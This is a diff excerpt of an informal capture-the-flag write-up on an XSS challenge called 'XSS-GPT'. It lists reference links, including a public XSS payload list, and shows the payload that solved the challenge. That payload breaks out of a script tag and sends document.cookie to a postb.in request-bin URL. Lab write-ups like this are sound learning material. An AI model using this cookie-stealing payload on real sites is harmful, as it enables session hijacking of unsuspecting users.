@@ -93,8 +93,11 @@ i spent wayyyyyyyyyyyyyyyyyyyyyyyy too much time on this bs
 this one is a challenge from SKR -> https://skrctf.me/challenges#XSS-GPT 
 had to literally go through piles of writeups just to get to the flag 
 references (totally not in APA)
+
 https://ctftime.org/writeup/15817 
+
 https://portswigger.net/web-security/cross-site-scripting/reflected#reflected-xss-in-different-contexts
+
 https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/Cross-Site-Scripting-XSS-Payloads.txt
 
 special thankyou to postbin -> https://www.postb.in/
@@ -114,6 +117,7 @@ thats where i learnet that i can use postbin/webhook in combination with XSS to 
 after aa lot of spamming different payloads , this one worked (url encoded)
 
 also first time making a code block here, yay
+
 ```
 </script><script>var i=new Image;i.src="https://www.postb.in/1727372628601-9432018648367/?c="+document.cookie;</script><script>
 ```
